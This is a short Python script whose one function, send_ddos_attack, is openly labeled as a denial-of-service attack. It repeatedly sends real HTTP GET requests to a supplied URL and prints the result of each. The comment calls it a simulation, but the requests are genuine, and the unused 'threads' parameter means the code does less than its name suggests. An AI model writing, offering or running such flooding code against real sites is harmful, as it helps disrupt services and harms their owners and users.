# do_something_extra.py

import requests
from rich.console import Console
import random

console = Console()

# Function to simulate a distributed denial of service (DDoS) attack
def send_ddos_attack(url, threads, duration):
    console.print(f"[yellow]Launching DDoS attack on {url}...[/yellow]")
    for _ in range(threads * duration):
        try:
            response = requests.get(url, timeout=2)
            if response.status_code == 200:
                console.print(f"[green]Request successful[/green]")
            else:
                console.print(f"[red]Failed with status: {response.status_code}[/red]")
        except requests.exceptions.RequestException as e:
            console.print(f"[red]Request failed: {e}[/red]")
